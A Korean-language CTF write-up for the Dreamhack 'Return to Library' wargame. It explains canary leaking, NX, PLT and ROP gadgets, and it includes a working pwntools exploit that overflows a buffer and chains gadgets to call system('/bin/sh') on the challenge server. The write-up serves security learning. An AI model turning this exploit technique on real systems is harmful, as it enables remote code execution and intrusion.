---
title: Return to Library
description: Dremhack [Wargame] - Return to Library
author: juhyeongkim
date: 2024-10-31 08:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/353)

## 바이너리 분석

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

**checksec**으로 바이너리를 검사해보면, **Canary**와 **NX**가 적용되어있기 때문에 **스택에 쉘코드를 주입 후 return_address를 해당 주소로 조작하는 것은 불가능하다.** (스택이 아닌 코드 영역으로 return_address를 조작해야함) 

**NX**로 인해 쉘코드를 스택에 주입할 수 없다고 하더라도, **바이너리의 코드 영역**과 **라이브러리의 코드 영역**에는 실행 권한이 존재하기 때문에, 해당 영역으로 return_address를 조작하면 익스플로잇이 여전히 가능하다.

그리고 C의 표준 라이브러리인 `libc`에는 익스플로잇에 사용할 수 있는 유용한 코드 가젯이 존재한다. 

`바이너리의 코드 영역`은 **ASLR이 적용되지 않아** 바이너리 생성 시 주소가 고정되어 있기 때문에 해당 코드 영역에서 익스플로잇에 필요한 가젯을 추출하여 사용할 수 있다. 

하지만, **PLT**를 이용하기 위해서는 소스 코드에서 사용된 함수(심볼)만 PLT를 통해 라이브러리에서 호출해올 수 있기 때문에 이를 잘 파악해야한다. 위 소스 코드를 살펴보면, 

1.
`const char* binsh = "/bin/sh";`와 `system("echo 'system@plt");`를 통해 `system()` 함수를 PLT 테이블에 등록하여 `system('/bin/sh')` 함수를 통해 쉘을 실행할 수 있고,  

---

참고로, ASLR이 걸려있어도 PIE가 적용되어 있지 않다면 PLT의 주소는 고정되어 있음. 

따라서, ASLR에 의해 랜덤화되는 라이브러리의 베이스 주소를 몰라도 PLT주소는 고정되어 있기 때문에 라이브러리 함수를 실행할 수 있음. 

해당 공격 기법을 **Return to PLT**라고 함.

---

2.
```c
printf("[1] Leak Canary\n");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```
를 통해, canary 값을 알 수 있다.

따라서, 카나리를 우회하고 return_address를 `system('/bin/sh')` 함수를 수행하는 코드 영역으로 return_address 를 조작하여 해당 문제를 풀이 할 수 있을 것이다.

<br>

## 리턴 가젯

가젯(gadget)은 코드 조각을 의미하는데, 여기서 **리턴 가젯**이란 다음과 같이 `ret`으로 끝나는 어셈블리 코드 조각을 의미한다.  

pwntools 설치 시 함께 설치되는 `ROPgadget`명령어를 통해 원하는 가젯을 구할 수 있다. (아래는 `rtl`의 코드 가젯 목록)

```shell
$ ROPgadget --binary rtl
Gadgets information
============================================================
...
0x0000000000400285 : ret
...

Unique gadgets found: 83
$
```

리턴 가젯은 여러번의 `ret`을 통해 반환 주소를 덮는 공격의 유연성을 높여서 익스플로잇에 **필요한 조건**을 만족할 수 있도록 돕는다.  

예를 들어 해당 문제에서는 `system('/bin/sh')`을 실행하기 위해 먼저 `rdi`를 `/bin/sh`로 설정하고 `system` 함수를 호출해야 하는데, 이를 위해서는 한번의 과정이 아닌 여러번의 과정이 필요하다.  

이럴 때 리턴 가젯을 여러번 사용하여 반환 주소와 이후의 버퍼를 연속적으로 덮어서, `pop rdi`로 `rdi`를 `/bin/sh`의 주소로 설정해주고, 이어지는 `ret`으로 `system`함수를 호출할 수 있다.

```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

대부분의 함수는 `ret`으로 종료되므로, 함수들도 리턴 가젯으로 사용될 수 있는데 이러한 공격을 **Return_Oriented Programming(ROP)** 라고 한다.

<br>

## Exploit 설계

### 1. 카나리 우회

먼저 해당 바이너리의 버퍼와 카나리 위치를 찾기 위해 gdb를 실행하면, 아래와 같이 어느 단계에서 더이상 나아갈 수 없게 된다.

<img width="841" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/7e96eab6-7ab3-4711-ad4e-478e9819613a">  

그 이유는 해당 함수에서 `system`함수를 PLT 테이블에 등록하는데, 이때 `/usr/bin/dash` 프로세스가 실행되어 더이상 `main` 안에서 이후 instruction으로 나아갈 수 없게 된다.  

<img width="876" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/0ee2b4f0-a90d-4537-ae98-703e888a2bc0">  

따라서, `objdump -d rtl`을 통해 직접 main 함수의 어셈블리 코드를 확인한 후 `buf`가 `rbp-0x40`, 카나리가 `rbp-0x8` 에 위치한다는 것을 인지한 후 canary를 얻기 위해 `b'a'*0x39`를 가장 먼저 페이로드로 보낸다.  

<img width="841" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/98c5a141-1d2d-45c0-bb81-277f7f208690">  

<br>

### 2. 반환 주소 조작

카나리를 우회하였다면 `sfp`를 `b'a'*0x8`로 덮은 후 반환 주소를 조작하여 `system('/bin/sh')` 함수가 실행되도록 하여야 한다. 

하지만, `system('/bin/sh')`을 한번에 완전히 실행하는 함수나 코드 가젯이 존재하지 않기 때문에, 여러 단계에 걸쳐 해당 함수를 실행해야 한다.

단계를 순서대로 살펴보자. 

1. `system()` 함수를 수행하기 위해 인자에 들어갈 값인 `rdi`에 `/bin/sh` 문자열이 저장된 주소를 대입해야한다. 따라서, `pop rdi` 코드 가젯을 사용할 것인데 이를 위해 해당 코드 가젯이 위치하는 스택 바로 아래에 `/bin/sh` 문자열의 주소를 위치시키고, `pop rdi; ret`으로 리턴 가젯을 설정하여 `pop rdi` 이후 리턴 가젯을 통해 다음 익스플로잇이 이어지도록 연결한다.

2. `rdi`에 `/bin/sh` 문자열의 주소를 저장했다면, 남은 `ret`을 통해 `system()` 함수가 실행되도록 `system@plt` 주소를 바로 다음 스택 주소에 위치시켜야한다. 이를 위해 `system@plt`의 주소를 찾아야 하는데, ASLR이 적용되어도 PIE가 적용되지 않으면 PLT 주소는 고정되어 있으므로 상수값처럼 다룰 수 있다.

3. 참고로 `system` 함수로 `rip`가 이동할 때, `system` 함수 내부의 `movaps` 명령어 때문에 **스택이 반드시 0x10 단위로 정렬되어 있어야 한다.**   

따라서, 만약 정상적으로 익스플로잇 코드를 작성했는데, **Segmentation Fault**가 발생한다면, return_address에 `ret` 리턴 가젯을 추가해주는 것을 기억하자.  

***`ret` 리턴 가젯은 `pop rip`와 같은데, 여기서 return_address에 `ret`이 위치하면 `rsp`가 한칸 아래로 이동하고, `rip`가 `ret`을 다시 가리키니까 여기서 `ret`이 없을 때와 같은 상황이 됨. 따라서, 익스플로잇 코드에 영향을 안줌***  

만약 return_address가 아니라 다른 곳에 `ret`이 위치한다면 rsp가 한칸 아래로 이동하고, 스택 바로 아래의 주소로 rip가 이동하는 것과 같은 동작을 함.

아래는 `pop rdi; ret` 코드 가젯, `/bin/sh`이 저장된 메모리 주소, `system@plt`의 주소를 찾는 명령어와 결과이다.  

`ROPgadget --binary <실행파일> --re "<필요한 코드 가젯>""`

<img width="808" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/e3685fef-de7d-4577-bd74-455409f1af62">

<img width="808" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/46d612b5-166e-45a7-8484-66935ce10c4c">

<img width="821" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/56db90ae-e728-411f-9b81-77fd84d50b04">

<br>

#### 참고

<img width="833" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/4bbcc1b2-3c08-4ae7-a54b-c466f7aeecc7">

`system()` 함수를 호출하기 위해 **PLT**주소가 아닌 **GOT** 주소나 **실제 라이브러리의 시스템 콜 주소**를 입력하면 어떻게 될까라는 의문이 생겼었다.

의문에 대한 답을 먼저 얘기하자면 PLT 주소 이외에 GOT나 라이브러리의 함수 주소를 넣으면 실행을 할 수 없다.

`GOT` 주소(`system@got.plt : 0x601028`)를 넣으면 실행할 수 없는 이유는, 먼저 `plt` 주소를 넣었을 때 동작하는 과정을 살펴보며 이해하자.

`x/i`를 통해 `system@plt` 주소를 확인해보면 아래와 같이 코드 영역이 나오는 것을 볼 수 있는데, `system@got.plt` 주소를 확인해보면 코드 영역이 아닌 `(bad)`라는 코드 영역이 아닌 값이 적혀있는 데이터 영역이 나온다.

애초에 데이터 영역인 `got` 주소에는 실행 권한조차 없다. `got`주소는 `libc`의 `system` 함수 주소가 적혀있는 데이터 영역이기 때문이다.

따라서, return_address에는 `got` 주소를 넣을 수 없다.

<img width="1096" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/5bcb3086-a3ee-4426-804d-5d1d2005e3c3">

<img width="736" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/d222f4b3-016a-404a-9453-399663c1669a">

`system` 함수가 단 한번도 실행되기 전의 상태에서 `got`는 `<system@plt+6>`의 주소를 담고 있다. 

이 때 `system`함수가 실행되면, 

1. `call system`

2. `system.plt` (여기서 `jmp got`를 수행)

3. `system.plt + 6` (`got`에 적혀있는 값) 

4. `resolve과정`

5.`libc`의 `system` 함수

이렇게 실행 흐름이 넘어가게 된다.  

resolve하게 되면서 `got`에는 `libc`의 실제 주소가 작성된다. 

이렇게 resolve된 이후 다시 `system`함수가 호출되면, `call system` -> `system.plt(여기서 jmp got를 수행)` -> `libc의 system 함수` 이런 실행 흐름을 갖게 된다.   

다시 정리해서 결론만 말하면, `got`는 실행할 수 있는 코드가 아니라 주소를 담고 있는 데이터 영역이기 때문에 `got`를 `ret`에 덮어 `got`로 실행 흐름을 옮겼다 하더라도 코드가 아니기 때문에 실행할 수 없는 것이다.

그리고 `libc`의 `system` 함수의 주소는 gdb에서 실행할 때는 디버깅의 편의를 위해 ASLR이 꺼져있기 때문에 고정되어 보이지만, 실제 바이너리 실행시에는 `libc`인 라이브러리의 주소가 ASLR에 따라 무작위로 바뀌므로 gdb에서 찾은 라이브러리 함수의 주소를 넣을 수는 없다.

추가로 `sfp`를 `b'a' * 0x8`처럼 dummy 값으로 덮으면 스택 프레임이 바뀌어서 NX가 적용되는 스택 영역의 범위가 바뀌는 것이 아닐까라는 생각이 있었는데, 

스택 영역은 프로세스가 실행될 때 OS가 매핑해주는 것이기 때문에 SFP를 변조하여 `rbp`가 이상한 곳을 가리키고 있다고 해도 `rbp`가 가리키는 곳이 stack 영역이 되는 것은 아니다.  

gdb에서 `vmmap` 명령어를 통해 확인해보면 `rbp`를 조작해도 여전히 `0x00007ffffffde000 ~ 0x00007ffffffff000`가 stack으로 유지된다. 그렇기 때문에 rbp가 가리키고 있는 영역에 NX 효력이 생기지는 않는다.

<img width="647" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/c03dec6a-6a7b-4852-932c-a8a1b61667da">

<br>

## Exploit 

```py
from pwn import *

context.arch = 'amd64'

p = remote('host3.dreamhack.games', 23240)

elf = ELF('rtl')

system_plt = elf.plt['system']
#system_plt = 0x601028
payload = b'a'*0x38

p.send(payload+b'a')
p.recvuntil(payload+b'a')

canary = b'\x00' + p.recvn(7)

pop_rdi_ret_gadget = 0x0000000000400853
binish = 0x400874
ret_gadget = 0x0000000000400285

payload += canary + b'a'*0x8 + p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)
# payload += canary + b'a'*0x8 + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)

p.send(payload)

p.interactive()
```

1. 바이너리의 `ret` 실행 전

<img width="536" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/b6817e70-2878-43f8-805c-43f31ebe0948">

2. 바이너리의 `ret` 실행 후 `rsp`와 `rip` 이동

<img width="544" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/dc46899e-9cfe-4ac4-bc08-2745ca351f20">

3. return_address에 조작한 `ret` 실행 이후

<img width="543" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/54bb151c-691c-4a85-b606-160a08af19af">

4. `pop rdi` 이후

<img width="771" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/af802e6d-41af-457d-81c2-4ccef6a0c25c">

5. `ret` 이후

<img width="533" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/03f6e906-7aa6-4e45-b5bd-260883bfc623">

`system@plt`로 `rip`가 이동하여 `system("/bin/sh")` 함수 실행으로 익스플로잇 완료
